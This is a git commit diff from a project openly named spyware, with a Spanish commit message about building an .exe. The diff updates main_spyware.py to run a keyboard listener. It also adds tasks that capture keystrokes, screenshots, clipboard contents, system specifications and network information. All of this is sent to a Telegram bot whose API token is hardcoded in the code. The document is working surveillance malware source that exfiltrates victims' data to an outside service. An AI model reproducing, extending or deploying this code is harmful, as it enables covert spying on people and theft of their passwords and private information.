233e1c5cfe46c69d4f5689bbd9116ada8d6ca3ff
Taratara <98030336+Tara7ara@users.noreply.github.com>
2025-01-11 17:17:25 +0100

    SPYWARE-21 Actualización .main y creación del .exe
    Actualización del main del proyecto, y creación del .exe con su build correspondiente.

--- main_spyware.py
+++ main_spyware.py
@@ -1,12 +1,11 @@
 import asyncio
 import logging
-import time
-import sys
 from telegram import Bot
-from helpers import registro_errores
-from keylogger import capturar_teclas, enviar_teclas
-
-
+from funciones_asyncronas import registro_errores, capturar_teclas, capture_screenshots, log_clipboard, especificaciones_sistema, informacion_red
+from pynput import keyboard as kb
+from keylogger import detect_k, release_k
+import pyautogui
+from pyautogui import pyscreeze
 
 async def main():
     logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
@@ -14,10 +13,17 @@ async def main():
     try:
         bot = Bot(token="7348242610:AAG4Jyl41n0DqCX5AYKskb3AXkJXB2IDJso")
         
+        listener = kb.Listener(on_press=detect_k, on_release=release_k)
+        listener.start()
+
         await asyncio.gather(
             capturar_teclas(bot),
-            enviar_teclas(bot),
+            capture_screenshots(bot),
+            log_clipboard(bot),
+            especificaciones_sistema(bot),
+            informacion_red(bot)
         )
+        print("Tasks launched successfully.")
     except Exception as e:
         registro_errores(f"Initialization error: {e}")
         print(f"Error: {e}")
